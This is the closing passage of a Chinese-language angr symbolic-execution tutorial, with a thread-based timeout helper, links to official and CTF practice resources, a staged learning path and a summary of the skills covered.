def run_with_timeout(func, timeout=60):
    """带超时的执行"""
    import threading
    
    result = [None]
    exception = [None]
    
    def worker():
        try:
            result[0] = func()
        except Exception as e:
            exception[0] = e
    
    thread = threading.Thread(target=worker)
    thread.daemon = True
    thread.start()
    thread.join(timeout)
    
    if thread.is_alive():
        print(f"执行超时（{timeout}秒）")
        return None
    
    if exception[0]:
        raise exception[0]
    
    return result[0]
```

### 8.5 学习资源与社区

#### 8.5.1 官方资源

- **官方文档**：https://docs.angr.io/
- **GitHub 仓库**：https://github.com/angr/angr
- **API 文档**：https://angr.io/api-doc/
- **示例代码**：https://github.com/angr/angr-doc/tree/master/examples

#### 8.5.2 学习路径建议

```
angr 学习路径建议：

入门阶段（1-2周）：
  [ ] 了解符号执行基本概念
  [ ] 安装 angr 环境
  [ ] 编写第一个 angr 脚本
  [ ] 解决简单的 crackme 题目

进阶阶段（2-4周）：
  [ ] 掌握 claripy 的使用
  [ ] 理解各种探索策略
  [ ] 学会使用 Hook 和 SimProcedure
  [ ] 解决中等难度的 CTF 逆向题

高级阶段（1-2个月）：
  [ ] 学习 Veritesting 等高级技术
  [ ] 掌握自定义 ExplorationTechnique
  [ ] 学习 angrop、rex 等插件
  [ ] 尝试漏洞挖掘和利用自动生成

专家阶段（持续学习）：
  [ ] 深入理解 angr 内部实现
  [ ] 贡献代码或插件
  [ ] 研究符号执行前沿技术
```

#### 8.5.3 练习资源

- **angr_ctf**：https://github.com/jakespringer/angr_ctf （angr 入门练习）
- **pwnable.kr**：https://pwnable.kr/ （pwn 练习平台）
- **pwnable.tw**：https://pwnable.tw/ （pwn 练习平台）
- **CTFtime**：https://ctftime.org/ （CTF 比赛日历）
- **HackTheBox**：https://www.hackthebox.com/ （在线靶场）

---

## 总结

符号执行是一项强大的二进制分析技术，而 angr 是目前最易用、功能最全面的符号执行框架之一。通过本文档的学习，你应该掌握了：

1. **符号执行基础**：理解符号变量、约束求解、路径探索的基本原理
2. **angr 入门**：能够安装环境、加载二进制、编写基本的符号执行脚本
3. **核心功能**：熟练使用 claripy、Simulation Manager、Hook、SimProcedure 等
4. **CTF 解题**：能够使用 angr 解决各类逆向题目
5. **漏洞挖掘**：了解如何使用 angr 发现和利用漏洞
6. **高级技巧**：掌握性能优化、循环处理、自定义探索策略等
7. **插件生态**：了解 angrop、rex 等常用插件的使用
8. **问题解决**：能够诊断和解决符号执行中的常见问题

符号执行不是银弹，它有其局限性（路径爆炸、性能问题等）。但在合适的场景下，它可以极大地提高分析效率，解决人工难以处理的问题。建议结合静态分析、动态调试、模糊测试等多种技术手段，形成完整的二进制分析工具箱。

继续学习，不断实践，你将能够更熟练地运用符号执行技术解决各种二进制安全问题。




